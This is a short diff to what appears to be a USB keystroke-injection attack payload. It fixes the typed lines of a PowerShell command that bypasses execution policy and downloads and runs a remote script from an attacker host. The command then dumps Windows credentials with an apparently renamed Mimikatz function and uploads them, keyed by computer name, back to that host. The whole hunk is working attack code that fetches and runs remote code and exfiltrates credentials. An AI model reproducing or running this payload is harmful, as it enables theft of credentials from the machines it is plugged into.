@@ -36,8 +36,8 @@ Q CMD
 Q ENTER
 Q DELAY 1000
 Q STRING powershell -NoP -Exec Bypass -c \"IEX \(New-Object Net.WebClient\).DownloadString\(\'http\:\/\/\$HOST_IP\/md.ps1\'\)\;
-Q \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\$env:computername\'\, \$o\)\;
-Q \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\EOF\'\, \"EOF"\)\"
+Q STRING \$o \= Invoke-Mimidogz -DumpCred\; \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\$env:computername\'\, \$o\)\;
+Q STRING \(New-Object Net.WebClient\).UploadString\(\'http\:\/\/\$HOST_IP\/\EOF\'\, \"EOF"\)\"
 Q ENTER
 
 mount -o sync /dev/nandf /root/udisk
